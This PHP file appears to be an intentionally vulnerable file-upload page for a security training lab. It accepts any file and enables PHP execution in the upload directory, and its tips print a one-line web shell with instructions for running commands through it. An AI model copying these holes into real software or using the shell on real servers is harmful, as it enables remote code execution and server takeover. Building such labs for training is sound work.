<?php
// --- session (safe guard) ---
if (session_status() === PHP_SESSION_NONE) session_start();

/*
  This page is intentionally vulnerable (no validation) for training.
  Fixes included:
  - Absolute path for saving uploads
  - Ensure /uploads exists
  - .htaccess so Apache serves (and optionally executes) files in /uploads
*/

// ---------- Paths ----------
$uploadDir = __DIR__ . '/uploads/';              // absolute FS path
$webBase   = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\'); // e.g. '' or '/subdir'
$webPath   = ($webBase === '' ? '' : $webBase) . '/uploads/'; // URL path

// Create uploads dir if missing
if (!is_dir($uploadDir)) {
    @mkdir($uploadDir, 0777, true);
}

// Ensure Apache will serve files in /uploads
// (For Apache 2.4; if you don't want PHP execution, remove the SetHandler/AddType lines.)
$htaccess = $uploadDir . '.htaccess';
if (!file_exists($htaccess)) {
    @file_put_contents($htaccess, <<<HT
Options +Indexes
<IfModule mod_authz_core.c>
  Require all granted
</IfModule>

# LAB ONLY: allow PHP to execute in uploads (vulnerable by design)
AddType application/x-httpd-php .php .phtml .php3 .pht .php5 .php7 .phar
<FilesMatch "\\.(php|phtml|php3|pht|php5|php7|phar)$">
  SetHandler application/x-httpd-php
</FilesMatch>
HT);
    @chmod($htaccess, 0666);
}

// ---------- Handle upload ----------
$message = '';
$messageType = '';
$linkHtml = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $name = basename($_FILES['file']['name']); // VULN: trust client filename
    $dest = $uploadDir . $name;

    if (is_uploaded_file($_FILES['file']['tmp_name']) && move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
        @chmod($dest, 0666);

        // Build a full clickable URL (works behind proxies too)
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
        $url    = $scheme . '://' . $host . $webPath . rawurlencode($name);

        $message = "File uploaded successfully: " . htmlspecialchars($name);
        $messageType = 'success';
        $linkHtml = "<br>Access at: <a href=\"" . htmlspecialchars($url) . "\" target=\"_blank\">" . htmlspecialchars($url) . "</a>";

        // Optional: bonus flag reveal for PHP files (as in your earlier code)
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        if ($ext === 'php' || $ext === 'phtml' || $ext === 'pht') {
            $hostDb = $_ENV['DB_HOST'] ?? 'db';
            $userDb = $_ENV['DB_USER'] ?? 'mylabuser';
            $passDb = $_ENV['DB_PASS'] ?? 'mylabpass';
            $dbName = $_ENV['DB_NAME'] ?? 'school_lab';

            mysqli_report(MYSQLI_REPORT_OFF);
            $conn = @new mysqli($hostDb, $userDb, $passDb, $dbName);
            if (!$conn->connect_errno) {
                if ($res = $conn->query("SELECT flag_value FROM flags WHERE flag_name='upload_shell' LIMIT 1")) {
                    $row = $res->fetch_assoc();
                    $flag = $row['flag_value'] ?? 'FLAG{ERROR}';
                    $message .= "<br><strong>PHP File Detected! Flag: " . htmlspecialchars($flag) . "</strong>";
                }
            }
        }
    } else {
        $message = "Upload failed! Check permissions or form enctype.";
        $messageType = 'error';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>File Upload (Vulnerable)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body{font-family:ui-sans-serif,system-ui,Segoe UI,Arial;margin:24px}
    .alert{padding:10px 12px;border-radius:8px;border:1px solid #ddd;margin:10px 0}
    .ok{background:#ecfdf5;border-color:#d1fae5}
    .err{background:#fef2f2;border-color:#fee2e2}
    .card{border:1px solid #e5e7eb;border-radius:12px;padding:16px;max-width:880px}
    input[type=file]{display:block;margin:8px 0}
    code,pre{background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:8px}
  </style>
</head>
<body>
  <div class="card">
    <h2>File Upload (Intentionally Vulnerable)</h2>

    <?php if ($message): ?>
      <div class="alert <?= $messageType==='success'?'ok':'err' ?>">
        <?= $message ?><?= $linkHtml ?>
      </div>
    <?php endif; ?>

    <form method="POST" enctype="multipart/form-data">
      <label>Select File:</label>
      <input type="file" name="file" required>
      <button type="submit">Upload</button>
    </form>

    <div style="margin-top:16px">
      <strong>Tips:</strong>
      <ul>
        <li>PNG/JPG should be served at <code><?= htmlspecialchars($webPath) ?>yourfile.png</code></li>
        <li>For lab RCE, upload <code>shell.php</code> with content:
          <pre>&lt;?php system($_GET['cmd'] ?? 'whoami'); ?&gt;</pre>
          Then browse: <code><?= htmlspecialchars($webPath) ?>shell.php?cmd=whoami</code>
        </li>
      </ul>
    </div>

    <div style="margin-top:16px">
      <h3>Uploaded Files</h3>
      <?php
      $files = @scandir($uploadDir);
      if ($files) {
          echo '<ul>';
          foreach ($files as $f) {
              if ($f === '.' || $f === '..' || $f === '.htaccess') continue;
              $href = $webPath . rawurlencode($f);
              echo '<li><a target="_blank" href="' . htmlspecialchars($href) . '">' . htmlspecialchars($f) . '</a></li>';
          }
          echo '</ul>';
      } else {
          echo '<p>No files uploaded yet.</p>';
      }
      ?>
    </div>

    <div class="alert" style="margin-top:16px">
      <b>Debug info (helps if you still see 404):</b><br>
      FS path: <code><?= htmlspecialchars($uploadDir) ?></code><br>
      URL path: <code><?= htmlspecialchars($webPath) ?></code>
    </div>
  </div>
</body>
</html>
